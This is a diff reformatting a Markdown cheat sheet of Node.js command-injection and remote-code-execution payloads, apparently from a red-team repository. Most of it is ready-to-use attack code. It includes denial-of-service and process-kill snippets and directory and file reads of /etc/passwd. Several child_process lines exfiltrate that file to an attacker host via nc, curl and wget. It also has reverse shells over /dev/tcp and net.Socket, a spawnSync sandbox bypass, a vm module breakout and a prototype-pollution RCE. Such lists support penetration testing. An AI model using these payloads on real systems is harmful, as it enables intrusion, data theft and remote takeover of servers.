@@ -1,54 +1,77 @@
-# https://blog.shiftleft.io/node-js-vulnerability-cheatsheet-447b0c9bdb99
+# NodeJS Command Injection / RCE
 
-# NodeJS Red Team Cheat Sheet
+> Reference: [Node.js Vulnerability Cheatsheet - ShiftLeft](https://blog.shiftleft.io/node-js-vulnerability-cheatsheet-447b0c9bdb99)
 
-A curated list of NodeJs Command Injection / RCE Payloads.
+---
 
-### Know the evil functions
-`eval()`,`setTimeout()`,`setInterval()`, `Function()`, `unserialize()`
+## Evil Functions
 
-### Know your weapons
-`fs` , `child_process`, `net`, `http`
+`eval()`, `setTimeout()`, `setInterval()`, `Function()`, `unserialize()`
 
-`spawn` = returns a stream, returns huge binary data to Node
+## Useful Modules
 
-`exec` = returns a buffer, should be used to return status
+| Module | Purpose |
+|--------|---------|
+| `fs` | File system access |
+| `child_process` | Command execution |
+| `net` | Raw TCP connections |
+| `http` | HTTP requests |
 
-### Attack Vectors
+`spawn` — returns a stream, use for huge binary data to Node
+`exec` — returns a buffer, use to return status
 
-Denial of Service
+---
+
+## Attack Vectors
+
+### Denial of Service
+
 ```javascript
 while(1)
 ```
-Exit the running process
+
+### Exit the Running Process
+
 ```javascript
 process.exit()
 ```
 
-Kill Process
+### Kill Process
+
 ```javascript
 process.kill(process.pid)
 ```
 
-Read current working directory
+### Read Current Working Directory
+
 ```javascript
 res.end(require('fs').readdirSync('.').toString())
 ```
 
-Read previous directory
+### Read Previous Directory
+
 ```javascript
 res.end(require('fs').readdirSync('..').toString())
 ```
 
-Read file
+### Read File
+
 ```javascript
 res.end(require('fs').readFileSync(fname))
 ```
-Spawn Magic ( by [@aaditya_purani](https://twitter.com/aaditya_purani))
+
+### Spawn Magic
+
+By [@aaditya_purani](https://twitter.com/aaditya_purani)
+
 ```javascript
 require('child_process').spawn('ls',['-a']).stdout.on('data', function (data) {console.log('own'+ data); });
 ```
-Child exec ( by [@artsploit](https://twitter.com/artsploit) )
+
+### Child exec
+
+By [@artsploit](https://twitter.com/artsploit)
+
 ```javascript
 require('child_process').exec('cat+/etc/passwd+|+nc+attackerip+80')
 ```
@@ -60,30 +83,47 @@ require('child_process').exec('bash+-c+"bash+-i+>%26+/dev/tcp/nc_host/nc_port+0>
 ```javascript
 require('child_process').exec('curl+-F+"x=`cat+/etc/passwd`"+attackersip.com')
 ```
-Wget post data (by [@brutelogic](https://twitter.com/brutelogic))
+
+### Wget Post Data
+
+By [@brutelogic](https://twitter.com/brutelogic)
+
 ```javascript
 require('child_process').exec('wget+--post-data+"x=$(cat+/etc/passwd)"+HOST')
 ```
 
-Using net (by [ibreak.software](http://ibreak.software))
+### Using net
+
+By [ibreak.software](http://ibreak.software)
+
 ```javascript
 var+net+=+require("net"),+sh+=+require("child_process").exec("/bin/bash");var+client+=+new+net.Socket();client.connect(80,+"attackerip",+function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});
 ```
 
-Using arguments[1] as response object (by [@OrhanAlbay](https://twitter.com/OrhanAlbay))
+### Using arguments[1] as Response Object
+
+By [@OrhanAlbay](https://twitter.com/OrhanAlbay)
+
 ```javascript
 arguments[1].end(require('child_process').execSync('whoami'))
 ```
+
 ```javascript
 arguments[1].end(require('child_process').execSync('cat /etc/passwd'))
 ```
 
-Bypass stream limits by compressing to gzip (by [@aaditya_purani](https://twitter.com/aaditya_purani))
+### Bypass Stream Limits via Gzip
+
+By [@aaditya_purani](https://twitter.com/aaditya_purani)
+
 ```javascript
 const pwn=require('zlib').createGzip();const inx=require('fs').createReadStream('app.json');const oux = require('fs').createWriteStream('unrestrictive.gz');inx.pipe(pwn).pipe(oux)
 ```
 
-Sandbox Bypass spawnSync (by [netspi](https://t.co/3D9kWREcUz))
+### Sandbox Bypass spawnSync
+
+By [netspi](https://t.co/3D9kWREcUz)
+
 ```javascript
 var resp = spawnSync('python',
 ['-c',
@@ -96,7 +136,9 @@ print(resp.stdout);
 print(resp.stderr);
 ```
 
-vm module breakout (by [pwnisher](https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html))
+### VM Module Breakout
+
+By [pwnisher](https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html)
 
 ```javascript
 "use strict";
@@ -106,7 +148,9 @@ process.mainModule.require('child_process').execSync('cat /etc/passwd').toString
 console.log(xyz);
 ```
 
-Alternative RCE payload (by [mahmoud](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html))
+### Alternative RCE Payload
+
+By [mahmoud](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
 
 ```javascript
 x = ''
@@ -116,9 +160,3 @@ myToStringDescriptor = Object.getOwnPropertyDescriptor(myToStringArr, 0)
 Object.defineProperty(Object.prototype, "toString", myToStringDescriptor)
 Object.constructor("test", this)()
 ```
-
-### Need More ?
-Repository would be maintained time to time. Feel free to contribute.
-
-### Contact
-[@aaditya_purani](https://twitter.com/aaditya_purani)
